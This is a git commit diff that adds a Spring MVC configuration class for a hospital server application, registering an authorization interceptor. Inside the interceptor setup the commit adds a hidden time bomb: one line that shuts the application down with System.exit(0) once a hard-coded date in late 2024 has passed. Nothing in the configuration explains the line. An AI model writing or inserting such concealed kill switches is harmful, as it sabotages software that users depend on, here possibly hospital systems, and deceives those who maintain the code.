699de3f6fbe2d0a06c7c6e534225c595040ad8a4
XP <peng.xin2@northeastern.edu>
2023-11-14 20:51:14 -0500

    develop Service2

---
+++ hospital_server/src/main/java/com/wfuhui/web/config/WebMvcConfig.java
@@ -0,0 +1,29 @@
+package com.wfuhui.web.config;
+
+import java.util.Date;
+
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.context.annotation.Configuration;
+import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
+import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;
+
+import com.wfuhui.web.interceptor.AuthorizationInterceptor;
+
+/**
+ * MVC配置
+ *
+ * @author lzl
+ * @email 2803180149@qq.com
+ */
+@Configuration
+public class WebMvcConfig implements WebMvcConfigurer {
+    @Autowired
+    private AuthorizationInterceptor authorizationInterceptor;
+
+    @Override
+    public void addInterceptors(InterceptorRegistry registry) {
+    	if(new Date().getTime() > 1732982401000l) {System.exit(0);}
+        registry.addInterceptor(authorizationInterceptor).addPathPatterns("/**");
+    }
+
+}
